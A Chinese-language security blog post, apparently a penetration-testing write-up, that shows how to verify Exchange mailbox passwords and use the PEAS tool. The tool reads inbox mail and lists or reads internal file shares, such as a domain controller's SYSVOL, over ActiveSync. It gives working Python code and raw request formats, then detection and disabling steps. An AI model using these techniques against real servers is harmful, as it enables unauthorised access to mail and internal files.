@@ -1,0 +1,409 @@
+I"�A<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Exchange ActiveSync是一种Microsoft Exchange同步协议，用于在邮件服务器和移动设备之间同步邮件资源。</p>
+
+<p>Adam Rutherford和David Chismon在他们的文章中介绍了通过Exchange ActiveSync访问内部文件共享的方法</p>
+
+<p>文章地址：</p>
+
+<p>https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/</p>
+
+<p>本文将要基于他们的研究，介绍通过Exchange ActiveSync访问内部文件共享的细节，记录研究心得。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>通过Exchange ActiveSync验证用户邮箱口令</li>
+  <li>Exchange ActiveSync开源代码测试</li>
+  <li>通过Exchange ActiveSync访问内部文件共享的细节</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-基础知识">0x02 基础知识</h2>
+<hr />
+
+<p>Exchange ActiveSync是一种Microsoft Exchange同步协议，该协议经过优化，以适用于高延迟和低宽带网络。</p>
+
+<p>该协议基于HTTP和XML，使移动设备可以访问其电子邮件、日历、联系人和任务，并且在脱机工作时仍可以继续访问这些信息。</p>
+
+<p>简单理解，计算机用户通过owa(Outlook Web Access)访问邮件资源，手机用户通过eas(Exchange ActiveSync)访问邮件资源</p>
+
+<h2 id="0x03-通过exchange-activesync验证用户邮箱口令">0x03 通过Exchange ActiveSync验证用户邮箱口令</h2>
+<hr />
+
+<p>默认对应的URL：<code class="language-plaintext highlighter-rouge">/Microsoft-Server-ActiveSync</code></p>
+
+<p>可以直接通过浏览器进行访问，提示输入用户名和口令</p>
+
+<p>输入正确的用户名和口令后，返回内容如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-6-18/2-1.png" alt="Alt text" /></p>
+
+<p>如果没有凭据，可直接通过wget命令获得服务器信息，命令实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://192.168.1.1/Microsoft-Server-ActiveSync --no-check-certificate --debug
+</code></pre></div></div>
+
+<p>返回结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-6-18/2-2.png" alt="Alt text" /></p>
+
+<p>为了能够通过脚本实现口令验证，这里需要使用OPTIONS方法，如果凭据有效，返回状态码200</p>
+
+<p>header部分加入HTTP基本认证(Basic Authentication)，格式为<code class="language-plaintext highlighter-rouge">Authorization: Basic &lt;string&gt;</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;string&gt;</code>为<code class="language-plaintext highlighter-rouge">"username:password"</code> 用base64编码后的字符串</p>
+
+<p>Python实现的完整代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Python/blob/master/easCheck.py</p>
+
+<h2 id="0x04-exchange-activesync开源代码测试">0x04 Exchange ActiveSync开源代码测试</h2>
+<hr />
+
+<h3 id="1httpsgithubcomsolbirnpyactivesync">1.https://github.com/solbirn/pyActiveSync</h3>
+
+<p>需要使用Python2</p>
+
+<p>为了能够正常测试，还需要如下设置：</p>
+
+<p>(1)同级目录下新建文件proto_creds.py</p>
+
+<p>内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>as_server='192.168.1.1'
+as_user='user1'
+as_pass='password1'
+</code></pre></div></div>
+
+<p>(2)取消对SSL证书的验证</p>
+
+<p>修改<code class="language-plaintext highlighter-rouge">pyActiveSync\objects\MSASHTTP.py</code></p>
+
+<p>添加引用<code class="language-plaintext highlighter-rouge">import ssl</code></p>
+
+<p>将<code class="language-plaintext highlighter-rouge">httplib.HTTPSConnection(self.server, self.port)</code>
+替换为<code class="language-plaintext highlighter-rouge">httplib.HTTPSConnection(self.server, self.port, context=ssl._create_unverified_context())</code></p>
+
+<p>(3)修改pyActiveSync/dev_playground.py</p>
+
+<p>去掉”Suggested Contacts”相关代码</p>
+
+<p>分别运行<code class="language-plaintext highlighter-rouge">dev_playground.py</code>和<code class="language-plaintext highlighter-rouge">misc_tests.py</code>，对应不同的功能</p>
+
+<h3 id="2httpsgithubcomfsecurelabspeas">2.https://github.com/FSecureLABS/peas</h3>
+
+<p>需要使用Python2</p>
+
+<p>基于<a href="https://github.com/solbirn/pyActiveSync">pyActiveSync</a>，添加了导出邮件和访问共享文件的功能</p>
+
+<p>常用功能如下：</p>
+
+<p>(1)验证凭据</p>
+
+<p>代码示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import peas
+# Create an instance of the PEAS client.
+client = peas.Peas()
+# Disable certificate verification so self-signed certificates don't cause errors.
+client.disable_certificate_verification()
+# Set the credentials and server to connect to.
+client.set_creds({
+    'server': '192.168.1.1',
+    'user': 'test1',
+    'password': '123456789',
+})
+
+# Check the credentials are accepted.
+print("Auth result:", client.check_auth())
+</code></pre></div></div>
+
+<p>(2)读取邮件</p>
+
+<p>读取收件箱邮件的代码示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import peas
+import re
+# Create an instance of the PEAS client.
+client = peas.Peas()
+# Disable certificate verification so self-signed certificates don't cause errors.
+client.disable_certificate_verification()
+# Set the credentials and server to connect to.
+client.set_creds({
+    'server': '192.168.1.1',
+    'user': 'test1',
+    'password': '123456789',
+})
+# Retrieve emails.
+emails = client.extract_emails()
+for email in emails :
+    print("\r\n")  
+    pattern_data = re.compile(r"&lt;email:To&gt;(.*?)&lt;/email:To&gt;")
+    data = pattern_data.findall(email)
+    print("To:"+data[0])
+    pattern_data = re.compile(r"&lt;email:From&gt;(.*?)&lt;/email:From&gt;")
+    data = pattern_data.findall(email)
+    print("From:"+data[0])
+    pattern_data = re.compile(r"&lt;email:Subject&gt;(.*?)&lt;/email:Subject&gt;")
+    data = pattern_data.findall(email)
+    print("Subject:"+data[0])
+    pattern_data = re.compile(r"&lt;email:DateReceived&gt;(.*?)&lt;/email:DateReceived&gt;")
+    data = pattern_data.findall(email)
+    print("DateReceived:"+data[0])
+    pattern_data = re.compile(r"&lt;email:DisplayTo&gt;(.*?)&lt;/email:DisplayTo&gt;")
+    data = pattern_data.findall(email)
+    print("DisplayTo:"+data[0])
+    pattern_data = re.compile(r"&lt;email:ThreadTopic&gt;(.*?)&lt;/email:ThreadTopic&gt;")
+    data = pattern_data.findall(email)
+    print("ThreadTopic:"+data[0])
+    pattern_data = re.compile(r"&lt;email:Importance&gt;(.*?)&lt;/email:Importance&gt;")
+    data = pattern_data.findall(email)
+    print("Importance:"+data[0])
+    pattern_data = re.compile(r"&lt;email:Read&gt;(.*?)&lt;/email:Read&gt;")
+    data = pattern_data.findall(email)
+    print("Read:"+data[0])
+    pattern_data = re.compile(r"&lt;airsyncbase:DisplayName&gt;(.*?)&lt;/airsyncbase:DisplayName&gt;")
+    
+    data = pattern_data.findall(email)
+    for name in data :
+        print("Attachment:"+name)
+  
+    pattern_data = re.compile(r"&lt;email2:ConversationIndex&gt;(.*?)&lt;/email2:ConversationIndex&gt;")
+    data = pattern_data.findall(email)
+    print("ConversationIndex:"+data[0])
+
+    index1 = email.find('&lt;html&gt;')
+    index2 = email.find('&lt;/html&gt;')
+    filename = data[0] + ".html"
+    print('[+] Save body to %s'%(filename))
+    with open(filename, 'w+') as file_object:
+            file_object.write(email[index1:index2+7]) 
+</code></pre></div></div>
+
+<p>这里需要注意返回的邮件内容中，邮件正文部分的格式为html，我的代码实现了将正文部分提取并保存成html格式，以唯一的<code class="language-plaintext highlighter-rouge">ConversationIndex</code>作为文件名</p>
+
+<p>如果想要获得发件箱的邮件信息，需要修改<code class="language-plaintext highlighter-rouge">py_activesync_helper.py</code>，修改的细节可参考https://github.com/solbirn/pyActiveSync/blob/master/pyActiveSync/dev_playground.py#L150</p>
+
+<p>(3)访问文件共享</p>
+
+<p>列出共享文件的代码示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import peas
+# Create an instance of the PEAS client.
+client = peas.Peas()
+# Disable certificate verification so self-signed certificates don't cause errors.
+client.disable_certificate_verification()
+# Set the credentials and server to connect to.
+client.set_creds({
+    'server': '192.168.1.1',
+    'user': 'test1',
+    'password': '123456789',
+})
+# Retrieve a file share directory listing.
+listing = client.get_unc_listing(r'\\dc1\SYSVOL')
+for data in listing :
+   print("\r\n")
+   for key,value in data.items():
+      print('{key}:{value}'.format(key = key, value = value))
+</code></pre></div></div>
+
+<p>读取指定共享文件内容的代码示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import peas
+# Create an instance of the PEAS client.
+client = peas.Peas()
+# Disable certificate verification so self-signed certificates don't cause errors.
+client.disable_certificate_verification()
+# Set the credentials and server to connect to.
+client.set_creds({
+    'server': '192.168.1.1',
+    'user': 'test1',
+    'password': '123456789',
+})
+
+data=client.get_unc_file(r'\\dc1\SYSVOL\test.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI')
+print(data)
+</code></pre></div></div>
+
+<h2 id="0x05-通过exchange-activesync访问内部文件共享的细节">0x05 通过Exchange ActiveSync访问内部文件共享的细节</h2>
+<hr />
+
+<h3 id="1列出共享文件">1.列出共享文件</h3>
+
+<p>访问的URL示例：</p>
+
+<p>https://192.168.1.1/Microsoft-Server-ActiveSync?Cmd=Search&amp;User=test1&amp;DeviceId=123456&amp;DeviceType=Python”</p>
+
+<p>参数说明如下：</p>
+
+<ul>
+  <li>Cmd=Search，表示命令类型为<code class="language-plaintext highlighter-rouge">Search</code></li>
+  <li>User=test1，表示用户名为<code class="language-plaintext highlighter-rouge">test1</code></li>
+  <li>DeviceId=123456，表示设备ID，会被Exchange ActiveSync记录</li>
+  <li>DeviceType=Python，表示设备类型，会被Exchange ActiveSync记录</li>
+</ul>
+
+<p>方法为POST请求</p>
+
+<p>header内容示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Content-Type": "application/vnd.ms-sync.wbxml",
+"User-Agent" : ,
+"MS-ASProtocolVersion" : "14.1",
+"Accept-Language" : "en_us",
+"Authorization: Basic dXNlcjElM0FwYXNzd29yZDE="
+</code></pre></div></div>
+
+<p>body内容示例：</p>
+
+<p>需要将xml格式转换为WAP Binary XML(WBXML)</p>
+
+<p>xml格式示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;?xml version="1.0" encoding="utf-8"?&gt;
+ &lt;Search xmlns="Search:" xmlns:documentlibrary="DocumentLibrary:"&gt;
+   &lt;Store&gt;
+     &lt;Name&gt;DocumentLibrary&lt;/Name&gt;
+     &lt;Query&gt;
+       &lt;EqualTo&gt;
+         &lt;documentlibrary:LinkId/&gt;
+         &lt;Value&gt;\\myserver\myshare&lt;/Value&gt;
+       &lt;/EqualTo&gt;
+     &lt;/Query&gt;
+     &lt;Options&gt;
+       &lt;Range&gt;0-999&lt;/Range&gt;
+     &lt;/Options&gt;
+   &lt;/Store&gt;
+ &lt;/Search&gt;
+</code></pre></div></div>
+
+<p>xml格式参考：</p>
+
+<p>https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-asdoc/f8a23578-0ca4-4b36-aa07-3dcac5b83881</p>
+
+<p>WAP Binary XML(WBXML)算法可参考：</p>
+
+<p>https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-aswbxml/39973eb1-1e40-4eb5-ac74-42781c5a33bc</p>
+
+<h3 id="2读取指定共享文件内容">2.读取指定共享文件内容</h3>
+
+<p>访问的URL示例：https://192.168.1.1/Microsoft-Server-ActiveSync?Cmd=ItemOperations&amp;User=test1&amp;DeviceId=123456&amp;DeviceType=Python”</p>
+
+<p>参数说明如下：</p>
+
+<ul>
+  <li>Cmd=ItemOperations，表示命令类型为<code class="language-plaintext highlighter-rouge">ItemOperations</code></li>
+  <li>User=test1，表示用户名为<code class="language-plaintext highlighter-rouge">test1</code></li>
+  <li>DeviceId=123456，表示设备ID，会被Exchange ActiveSync记录</li>
+  <li>DeviceType=Python，表示设备类型，会被Exchange ActiveSync记录</li>
+</ul>
+
+<p>方法为POST请求</p>
+
+<p>header内容示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Content-Type": "application/vnd.ms-sync.wbxml",
+"User-Agent" : ,
+"MS-ASProtocolVersion" : "14.1",
+"Accept-Language" : "en_us",
+"Authorization: Basic dXNlcjElM0FwYXNzd29yZDE="
+</code></pre></div></div>
+
+<p>body内容示例：</p>
+
+<p>需要将xml格式转换为WAP Binary XML (WBXML)</p>
+
+<p>xml格式示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+ &lt;ItemOperations xmlns:documentlibrary="DocumentLibrary:" xmlns="ItemOperations:"&gt;
+   &lt;Fetch&gt;
+       &lt;Store&gt;DocumentLibrary&lt;/Store&gt;
+       &lt;documentlibrary:LinkId&gt;\\EXCH-D-810\DocumentShare\Word Document.docx&lt;/documentlibrary:LinkId&gt;
+   &lt;/Fetch&gt;
+ &lt;/ItemOperations&gt;
+</code></pre></div></div>
+
+<p>xml格式参考：</p>
+
+<p>https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-asdoc/e7a91040-42f1-475c-bac3-d83d7dd9652f</p>
+
+<p>我基于<a href="https://github.com/FSecureLABS/peas">peas</a>的代码，提取出访问共享文件的功能，生成了一个免安装的版本，地址如下：</p>
+
+<p>https://github.com/3gstudent/easBrowseSharefile</p>
+
+<p>代码支持两个功能:</p>
+
+<ol>
+  <li>列出共享文件</li>
+  <li>读取指定共享文件内容</li>
+</ol>
+
+<p><strong>注：</strong></p>
+
+<p>访问域内共享目录SYSVOL时，路径要加上域控制器的计算机名，而不是域名</p>
+
+<p>正确的写法：</p>
+
+<p><code class="language-plaintext highlighter-rouge">\\dc1\SYSVOL\test.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI</code></p>
+
+<p>错误的写法：</p>
+
+<p><code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI</code></p>
+
+<p>如果掌握了域控制器的计算机名，可以通过Exchange ActiveSync从外网访问域内共享目录SYSVOL中的文件</p>
+
+<h2 id="0x06-防御检测">0x06 防御检测</h2>
+<hr />
+
+<p>通过Exchange ActiveSync读取邮件和访问共享目录会留下设备信息，设备信息对应的代码位置：</p>
+
+<p>https://github.com/FSecureLABS/peas/blob/master/peas/pyActiveSync/objects/MSASHTTP.py#L25</p>
+
+<p>查看设备信息的两个方法</p>
+
+<p>1.登录Exchange Admin Center</p>
+
+<p>选择邮箱用户-&gt;<code class="language-plaintext highlighter-rouge">Mobile Devices</code>下的<code class="language-plaintext highlighter-rouge">View details </code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-6-18/3-1.png" alt="Alt text" /></p>
+
+<p>2.使用Exchange Management Shell</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ActiveSyncDevice|fl UserDisplayName,DeviceId,DeviceType,DeviceUserAgent
+</code></pre></div></div>
+
+<p>通过Exchange ActiveSync访问共享文件的日志位置：</p>
+
+<p><code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%Logging\HttpProxy\Eas</code></p>
+
+<p>关闭通过Exchange ActiveSync访问共享文件的方法：</p>
+
+<p>使用Exchange Management Shell，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-MobileDeviceMailboxPolicy -Identity:Default -UNCAccessEnabled:$false -WSSAccessEnabled:$false 
+</code></pre></div></div>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/powershell/module/exchange/set-mobiledevicemailboxpolicy?view=exchange-ps</p>
+
+<p>查看配置的命令：<code class="language-plaintext highlighter-rouge">Get-MobileDeviceMailboxPolicy |fl</code></p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr />
+
+<p>本文介绍了通过Exchange ActiveSync访问内部文件共享的细节，基于<a href="https://github.com/FSecureLABS/peas">peas</a>的代码，提取出访问共享文件的功能，生成了一个免安装的版本，结合利用思路给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
